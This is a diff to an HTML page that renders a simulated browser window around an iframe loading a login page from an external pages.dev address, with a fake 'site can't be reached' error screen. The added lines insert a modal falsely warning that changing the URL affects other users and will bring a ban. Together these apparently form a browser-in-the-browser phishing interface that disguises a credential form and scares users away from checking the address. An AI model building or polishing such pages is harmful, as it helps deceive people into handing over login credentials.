@@ -53,8 +53,8 @@
                         </div>
                     </div>
                     
-                    <!-- Iframe Content -->
-                    <div class="browser-content">
+                    <!-- Browser Content -->
+                    <div class="browser-content" id="browser-content">
                         <iframe 
                             id="login-iframe" 
                             src="https://mccglogin.pages.dev" 
@@ -66,7 +66,7 @@
                         <div id="error-page" class="error-page hidden">
                             <div class="error-content">
                                 <svg viewBox="0 0 24 24" width="64" height="64" fill="#72767d">
-                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                 </svg>
                                 <h2 id="error-domain">This site can't be reached</h2>
                                 <p id="error-message">Check if there is a typo in the URL.</p>
@@ -75,6 +75,24 @@
                         </div>
                     </div>
                 </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- URL Warning Modal -->
+    <div id="url-warning-modal" class="modal hidden">
+        <div class="modal-backdrop" id="modal-backdrop"></div>
+        <div class="modal-content">
+            <div class="modal-icon">
+                <svg viewBox="0 0 24 24" width="48" height="48" fill="#f04747">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+            </div>
+            <h2>Warning</h2>
+            <p>Changing the URL messes with other users' interface. If you continue, it will result in a ban.</p>
+            <div class="modal-buttons">
+                <button id="modal-cancel-btn" class="secondary-btn">Cancel</button>
+                <button id="modal-continue-btn" class="danger-btn">Continue Anyway</button>
             </div>
         </div>
     </div>
